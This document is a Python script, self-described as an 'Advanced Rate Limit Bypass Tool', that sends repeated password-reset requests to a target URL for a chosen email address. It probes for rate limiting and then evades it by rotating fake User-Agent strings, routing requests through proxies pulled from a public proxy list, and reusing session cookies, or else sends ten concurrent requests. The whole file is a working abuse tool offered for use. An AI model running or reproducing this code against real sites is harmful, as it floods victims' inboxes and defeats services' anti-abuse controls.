import requests
import time
import random
import argparse
import logging
import concurrent.futures
from fake_useragent import UserAgent

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Fetch dynamic proxy list (Optional: Use if needed)
def get_proxies():
    url = "https://www.proxy-list.download/api/v1/get?type=http"
    try:
        response = requests.get(url)
        proxy_list = response.text.split("\r\n")[:-1]
        return [f"http://{proxy}" for proxy in proxy_list]
    except Exception as e:
        logging.error(f"Failed to fetch proxies: {e}")
        return []

# Initialize proxies
proxies = get_proxies()

# User-Agent rotation
ua = UserAgent()

# Enhanced Rate Limit Detection
def check_rate_limit(url, email):
    response = requests.post(url, data={'email': email})
    
    # Detect based on headers
    if 'Retry-After' in response.headers:
        return True, int(response.headers['Retry-After'])
    
    # Detect based on response time (Soft Rate Limiting)
    start_time = time.time()
    requests.post(url, data={'email': email})
    response_time = time.time() - start_time

    if response_time > 2:  # If response is artificially delayed, assume rate limit
        return True, 0

    return False, 0

# Function to send an email with different bypass techniques
def send_email(url, email, headers=None, proxy=None, use_cookies=False):
    try:
        session = requests.Session()
        if use_cookies:
            session.get(url)  # Establish session to generate cookies

        response = session.post(url, data={'email': email}, headers=headers, proxies=proxy)
        
        if response.status_code == 200:
            logging.info(f"Email sent successfully to {email}")
        else:
            logging.warning(f"Failed to send email to {email}: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending email to {email}: {e}")

# Bypass Techniques
def bypass_rate_limit(url, email):
    methods = [
        lambda: send_email(url, email, headers={'User-Agent': ua.random}),
        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'http': random.choice(proxies)}),
        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'https': random.choice(proxies)}),
        lambda: send_email(url, email, headers={'User-Agent': ua.random}, use_cookies=True),
    ]

    for method in methods:
        try:
            method()
            logging.info(f"Bypassed rate limit using method: {method.__name__}")
            return True
        except Exception as e:
            logging.error(f"Failed to bypass rate limit using method: {e}")
            continue

    return False

# Main function
def main():
    parser = argparse.ArgumentParser(description='Advanced Rate Limit Bypass Tool')
    parser.add_argument('--target', required=True, help='Target URL for password reset')
    args = parser.parse_args()

    email = input("Enter the registered email: ")

    has_rate_limit, delay = check_rate_limit(args.target, email)
    
    if has_rate_limit:
        logging.info("Rate limit found. Attempting to bypass...")
        bypass_rate_limit(args.target, email)
    else:
        logging.info("No rate limit found. Sending emails...")

        # Send multiple emails concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_email, args.target, email) for _ in range(10)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error in sending email: {e}")

if __name__ == "__main__":
    main()
